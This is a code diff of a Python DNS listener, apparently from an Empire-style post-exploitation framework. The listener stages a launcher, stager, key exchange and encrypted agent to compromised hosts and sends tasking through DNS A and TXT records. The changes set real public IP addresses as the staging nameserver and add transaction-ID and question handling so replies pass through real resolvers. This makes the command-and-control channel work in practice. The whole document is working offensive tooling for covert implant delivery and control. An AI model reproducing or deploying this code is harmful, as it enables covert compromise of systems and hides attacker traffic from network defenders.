@@ -2,6 +2,7 @@
 # A and TXT record requests for some subset are significant, corresponding to stages of the handshake process
 # others can be used for tasking (need to encode nonce in order to avoid caching
 # use this to create main event loop
+# don't forget the importance of the source port
 import logging
 # turn off those irritating IPv6 warning messages
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -56,9 +57,9 @@ class Listener:
                 'Value'         :   "www.,www2.,marketing.,cdn.,beta.,uat."
             },
             'Host' : {
-                'Description'   :   'Hostname/IP for staging.',
+                'Description'   :   'Hostname/IP for staging. This is the IP address of the DNS server',
                 'Required'      :   True,
-                'Value'         :   '10.10.10.10'
+                'Value'         :   '208.67.220.220'
             },
             'BindIP' : {
                 'Description'   :   'The IP to bind to on the control server.',
@@ -120,10 +121,10 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'minotaur'
             },
-            'IPEOF' : {
+            'IPNS2' : {
                 'Description'   :   'IP address for NS2',
                 'Required'      :   True,
-                'Value'         :   '192.168.1.2'
+                'Value'         :   '81.174.172.4'
             },
             'TaskingHostname' : {
                 'Description'   :   'Hostname for agent tasking received via A records',
@@ -321,19 +322,19 @@ class Listener:
                 launcherBase += "        txn_int += 1\n"
                 launcherBase += "        if binascii.hexlify(agent_tmp)[7] == '3':\n"
                 launcherBase += "            break\n"
-                launcherBase += "        offset = 25 + len(hostname)\n"
+                launcherBase += "        offset = 31 + len(hostname)\n"
                 #launcherBase += "        print 'offset {}'.format(offset)\n"
                 launcherBase += "        agent_base64.append(agent_tmp[offset:])\n"
-                #launcherBase += "        print(agent_tmp[offset:])\n"
+                launcherBase += "        print(agent_tmp[offset:])\n"
                 launcherBase += "        counter += 1\n"
                 launcherBase += "    except socket.timeout:\n"
                 launcherBase += "        pass\n"
                 launcherBase += "ba = bytearray()\n"
                 launcherBase += "for ele in agent_base64:\n"
                 launcherBase += "    ba.extend(binascii.a2b_base64(ele))\n"
-                #launcherBase += "print 'length {}'.format(len(ba))\n"
-                #launcherBase += "m = hashlib.sha256(ba)\n"
-                #launcherBase += "print m.hexdigest()\n"
+                launcherBase += "print 'length {}'.format(len(ba))\n"
+                launcherBase += "m = hashlib.sha256(ba)\n"
+                launcherBase += "print m.hexdigest()\n"
                 launcherBase += "a=str(ba)\n"
 
                 # download the stager and extract the IV
@@ -548,27 +549,29 @@ def send_message(packets=None):
         reply = DNS(
             id=reply_id, qr=1, ancount=1, qdcount=1, arcount=1,
             qd=reply_qd,
-            an=DNSRR(rrname=fake_domain, type='NS', rdata=reply_hostname+'.'+fake_domain, ttl=86400),
-            ar=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=86400))    
+            an=DNSRR(rrname=fake_domain, type='NS', rdata=reply_hostname+'.'+fake_domain, ttl=300),
+            ar=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))    
         sock.sendto(bytes(reply), reply_addr_tuple)
 
     def send_a_record_reply(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple):
         reply = DNS(
             ancount=1, qr=1,
-            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=1234))
+            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))
         sock.sendto(bytes(reply), reply_addr_tuple)
 
-    def send_a_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id):
+    def send_a_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id, reply_qd):
         reply = DNS(
             id=reply_id,ancount=1, qr=1,
-            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=1234))
+            qd=reply_qd,
+            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=300))
         sock.sendto(bytes(reply), reply_addr_tuple)
-        
-    def send_txt_record_reply(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple):
+
+    def send_txt_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id, reply_qd):
         print "send_txt_record_reply host: {}".format(reply_hostname)
         reply = DNS(
-            ancount=1, qr=1,
-            an=DNSRR(rrname=str(reply_hostname), type='TXT', rdata="DEADBEEF", ttl=1234))
+            id=reply_id,ancount=1, qr=1,
+            qd=reply_qd,
+            an=DNSRR(rrname=str(reply_hostname), type='TXT', rdata="DEADBEEF", ttl=300))
         sock.sendto(bytes(reply), reply_addr_tuple)
         txt_request, txt_addr = sock.recvfrom(512)
         txt_dns = DNS(txt_request)
@@ -586,9 +589,9 @@ def send_message(packets=None):
             data,server_dns=sock.recvfrom(512)
             a_dns = DNS(data)
             if self.is_eof_response(a_dns):
-                self.send_a_record_reply(sock, recv_hostname, ipeof, addr)
+                self.send_a_record_reply_id(sock, recv_hostname, ipeof, server_dns, a_dns.id, a_dns.qd)
                 break
-            self.send_a_record_reply(sock, recv_hostname, ipack, addr)
+            self.send_a_record_reply_id(sock, recv_hostname, ipack, server_dns, a_dns.id, a_dns.qd)
             a_host = a_dns[DNSQR].qname.decode('ascii')
             a_host = a_host.replace('.' + fake_domain, "")
             a_array = a_host.split('.')
@@ -599,43 +602,54 @@ def send_message(packets=None):
                 a_base32 = a_base32+a_array[0]
             elif len(a_array) == 2:
                 a_base32 = a_base32+a_array[0]+a_array[1]
+        print a_base32
         a_decode=base64.b32decode(a_base32)
 
         return a_decode
     
-    def process_tasking_txt(self, hostname, sock, payload, addr, ipack, txtstoptransfer):
-        self.send_txt_record_reply(sock, hostname, ipack, addr)
+    def process_tasking_txt(self, hostname, sock, payload, addr, ipack, txtstoptransfer, reply_id, reply_qd):
+        self.send_txt_record_reply_id(sock, hostname, ipack, addr)
         txt_request, txt_addr = sock.recvfrom(512)
 
-        self.send_payload_via_txt(hostname, sock, payload, addr, txtstoptransfer)
+        self.send_payload_via_txt(hostname, sock, payload, addr, txtstoptransfer, reply_id, reply_qd)
         
-    def stop_data_transfer(self, sock, host, port, txtstoptransfer, hostname):
+    def stop_data_transfer(self, sock, host, port, txtstoptransfer, hostname, reply_id):
         #sock.sendto(bytes("EOF"),(host, int(port)))
-        txt_snd = DNS(qr=1,ancount=0,rd=1,ra=1,qdcount=1,rcode="name-error", qd=DNSRR(rrname=str(hostname), type='TXT', rdata="", ttl=1234))
+        print "STOPPING DATA TRANSFER"
+        txt_snd = DNS(id=reply_id,qr=1,ancount=0,rd=1,ra=1,qdcount=1,rcode="name-error", qd=DNSRR(rrname=str(hostname), type='TXT', rdata="", ttl=300))
         sock.sendto(bytes(txt_snd),(host,int(port)))
                 
-    def send_payload_via_txt(self, hostname, sock, payload, addr, txtstoptransfer):
+    def send_payload_via_txt(self, hostname, sock, payload, addr, txtstoptransfer, reply_id, reply_qd):
         # TODO fix this counter
         counter = 0
+
+        s2_reply_id = reply_id
+        s2_reply_qd = reply_qd
+        s2_addr = addr
+        
         # max length of TXT record after headers 
         n = 168
         #m = hashlib.sha256(payload)
         #print m.hexdigest()
-
+        
         print "send_payload_via_txt - sending response {} with payload len {} to tuple {}".format(hostname, len(payload), addr)
         for bytes_to_encode in [payload[i:i+n] for i in range(0, len(payload), n)]:
             ascii_to_send = binascii.b2a_base64(bytes_to_encode)
-            #print "send_payload_via_txt - sending {}".format(ascii_to_send)
-            
+            print "send_payload_via_txt - sending {}".format(ascii_to_send)
+            print "send_payload_via_txt - send ID {} to hostname {}".format(str(s2_reply_id),hostname)
             txt_snd = DNS(
-                id=counter, ancount=1, qr=1,
-                an=DNSRR(rrname=str(hostname), type='TXT', rdata=ascii_to_send, ttl=1234))
+                id=s2_reply_id, ancount=1, qr=1,
+                qd=s2_reply_qd,
+                an=DNSRR(rrname=str(hostname), type='TXT', rdata=ascii_to_send, ttl=300))
 
             #time.sleep(randint(0,3))
 
-            sock.sendto(bytes(txt_snd),addr)
+            sock.sendto(bytes(txt_snd), s2_addr)
             txt_request, txt_addr = sock.recvfrom(512)
             txt_dns = DNS(txt_request)
+            s2_reply_id = txt_dns.id
+            s2_reply_qd = txt_dns.qd
+            s2_addr = txt_addr
             if not txt_dns.id == counter:
                 # handles pkt loss from server to client
                 #print "need to retransmit, counter is: {} recv'd: {}".format(counter, txt_dns.id)
@@ -644,28 +658,28 @@ def send_message(packets=None):
             else:
                 counter += 1
             hostname = str(txt_dns[DNSQR].qname)
-        self.stop_data_transfer(sock, addr[0], addr[1], txtstoptransfer, hostname)
+        self.stop_data_transfer(sock, s2_addr[0], s2_addr[1], txtstoptransfer, hostname, s2_reply_id)
         
     # Stage 1
-    def trigger_staging(self, sock, recv_hostname, ipstagetolauncher, addr):
+    def trigger_staging(self, sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd):
         # extract second label from hostname
         b32RoutingPacket = recv_hostname.split('.')[1]
         try:
             routingPacket = base64.b32decode(b32RoutingPacket)
-            self.send_a_record_reply(sock, recv_hostname, ipstagetolauncher, addr)
+            self.send_a_record_reply_id(sock, recv_hostname, ipstagetolauncher, addr, reply_id, reply_qd)
             return routingPacket
         except Exception as e:
             print e
 
     # Stage 3 and 5
-    def process_a_records(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, addr, fake_domain, astoptransfer, ipeof):
-        self.send_a_record_reply(sock, recv_hostname, ipack, addr)
+    def process_a_records(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd):
+        self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
         data=self.recv_data_via_a_record(sock, recv_hostname, ipack, addr, fake_domain, ipeof)
         return data
 
     # Agent requests tasking information
-    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer):
-        self.send_a_record_reply(sock, recv_hostname, ipack, addr)
+    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, reply_id, reply_qd):
+        self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
 
         a_base32 = ""
         while True:
@@ -699,7 +713,7 @@ def send_message(packets=None):
         return results
                             
     # Stage 2
-    def send_stager_to_launcher(self, sock, hostname, addr, stagingKey, routingPacket, listenerOptions, txtstoptransfer):
+    def send_stager_to_launcher(self, sock, hostname, addr, stagingKey, routingPacket, listenerOptions, txtstoptransfer, reply_id, reply_qd):
         # TODO fix counter
         offset = 0
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
@@ -712,35 +726,35 @@ def send_message(packets=None):
                         stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
                         # TODO fix response code
                         print helpers.color('[!] listeners/dns send_stager_to_launcher(): got stager with length {} and response code {}'.format(len(stage),200))
-                        self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer)
+                        self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
                     elif results.startswith('ERROR:'):
                         #dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/dns')
                                         
                         if 'not in cache' in results:
                             # signal the client to restage
                             print helpers.color("[*] Orphaned agent from %s, signaling restaging" % (addr[0]))
-                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer)
+                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
                         else:
-                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer)
+                            return self.send_payload_via_txt(hostname, sock, stage, addr, txtstoptransfer, reply_id, reply_qd)
     # Stage 4
-    def send_crypto_to_stager(self, hostname, sock, stagingKey, listenerOptions, routingPacket, addr, ipack, txtstoptransfer):
+    def send_crypto_to_stager(self, hostname, sock, stagingKey, listenerOptions, routingPacket, addr, ipack, txtstoptransfer, reply_id, reply_qd):
         m = hashlib.sha256(routingPacket)
         print "SHA256 of routingPacket {}".format(m.hexdigest())
-        hostname = self.send_txt_record_reply(sock, hostname, ipack, addr)
+        hostname = self.send_txt_record_reply_id(sock, hostname, ipack, addr, reply_id, reply_qd)
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
         if dataResults and len(dataResults) > 0:
             for (language, results) in dataResults:
                 if results:
                     if not results.startswith('STAGE0') or not results.startswith('STAGE2') or not results.startswith('ERROR'):
                         print "send_crypto_to_stager - About to send to {} with payload len {}".format(hostname, len(results))
-                        self.send_payload_via_txt(hostname, sock, results, addr, txtstoptransfer)
+                        self.send_payload_via_txt(hostname, sock, results, addr, txtstoptransfer, reply_id, reply_qd)
 
     # Stage 6
-    def send_agent_to_stager(self, hostname, stagingKey, sock, stager_crypto, listenerOptions, addr, ipack, txtstoptransfer):
+    def send_agent_to_stager(self, hostname, stagingKey, sock, stager_crypto, listenerOptions, addr, ipack, txtstoptransfer, reply_id, reply_qd):
         # TODO fix the counter
         offset = 0
 
-        self.send_txt_record_reply(sock, hostname, ipack, addr)
+        self.send_txt_record_reply_id(sock, hostname, ipack, addr, reply_id, reply_qd)
         
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stager_crypto, listenerOptions, addr[0])
         if dataResults and len(dataResults) > 0:
@@ -757,7 +771,7 @@ def send_message(packets=None):
                         agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
                         encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, zlib.compress(agentCode,9))
                         # TODO: wrap ^ in a routing packet?
-                        self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer)
+                        self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer, reply_id, reply_qd)
     
     def start_server(self, listenerOptions):
         """
@@ -776,7 +790,9 @@ def send_message(packets=None):
         ipack = listenerOptions['IPACK']['Value']
         ipeof = listenerOptions['IPEOF']['Value']
         ipns1 = listenerOptions['IPNS1']['Value']
+        ipns2 = listenerOptions['IPNS2']['Value']
         ns1hostname = listenerOptions['NS1Hostname']['Value']
+        ns2hostname = listenerOptions['NS2Hostname']['Value']
         stageonehostname = listenerOptions['StageOneHostname']['Value']
         stagetwohostname = listenerOptions['StageTwoHostname']['Value']
         stagethreehostname = listenerOptions['StageThreeHostname']['Value']
@@ -812,24 +828,29 @@ def send_message(packets=None):
                     #print "Received hostname {}".format(host)
                     if dns[DNSQR].qtype == 1:
                         print "DNS query of type A recv'd"
+                        # DNS server functionality: answer NS & A record requests for our nameservers
                         if host.startswith(ns1hostname):
-                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id)
+                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id, dns.qd)
+                        elif host.startswith(fake_domain):
+                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id, dns.qd)
+                        elif host.startswith(ns2hostname):
+                            self.send_a_record_reply_id(sock, host, ipns2, addr, dns.id, dns.qd)
                         # Stage 1 (Trigger download of stager to launcher)
                         elif host.startswith(stageonehostname):
                             print "[STAGE 1]"
-                            stageone_results = self.trigger_staging(sock, host, ipstagetolauncher, addr)
+                            stageone_results = self.trigger_staging(sock, host, ipstagetolauncher, addr, dns.id, dns.qd)
                         # Stage 3 (Process client DH key) 
                         elif host.startswith(stagethreehostname):
                             print "[STAGE 3]"
-                            stagethree_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof)
+                            stagethree_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
                         # Stage 5 (Process encrypted nonce + sysinfo)
                         elif host.startswith(stagefivehostname):
                             print "[STAGE 5]"
-                            stagefive_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof)
+                            stagefive_results = self.process_a_records(sock, stagingKey, listenerOptions, host, ipack, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
                         # Tasking
                         elif host.startswith(taskinghostname):
                             print "[TASKING A]"
-                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer)
+                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, dns.id, dns.qd)
                         else:
                             self.default_response()
                     elif dns[DNSQR].qtype == 16:
@@ -837,21 +858,22 @@ def send_message(packets=None):
                         # Stage 2 (Transfer stager to launcher)
                         if host.startswith(stagetwohostname + '0'):
                             print "[STAGE 2]"
-                            self.send_stager_to_launcher(sock, host, addr, stagingKey, stageone_results, listenerOptions, txtstoptransfer)
+                            self.send_stager_to_launcher(sock, host, addr, stagingKey, stageone_results, listenerOptions, txtstoptransfer, dns.id, dns.qd)
                         # Stage 4 (Transfer listener DH key to stager)
                         elif host.startswith(stagefourhostname + '.'):
                             print "[STAGE 4]"
-                            self.send_crypto_to_stager(host, sock, stagingKey, listenerOptions, stagethree_results, addr, ipack, txtstoptransfer)
+                            self.send_crypto_to_stager(host, sock, stagingKey, listenerOptions, stagethree_results, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                         # Stage 6 (Transfer agent to stager)
                         elif host.startswith(stagesixhostname):
                             print "[STAGE 6]"
-                            self.send_agent_to_stager(host, stagingKey, sock, stagefive_results, listenerOptions, addr, ipack, txtstoptransfer)
+                            self.send_agent_to_stager(host, stagingKey, sock, stagefive_results, listenerOptions, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                         # Transfer tasking to agent
                         elif host.startswith(taskingtxthostname):
                             print "[TASKING TXT]"
-                            self.process_tasking_txt(host, sock, tasking_results, addr, ipack, txtstoptransfer)
+                            self.process_tasking_txt(host, sock, tasking_results, addr, ipack, txtstoptransfer, dns.id, dns.qd)
                     elif dns[DNSQR].qtype == 2:
                         # NS request recvd
+                        print "NS query received"
                         if host.startswith(fake_domain):
                             self.send_ns_response(fake_domain, ns1hostname, ipns1, addr, sock, dns.id, dns.qd)
                     else:
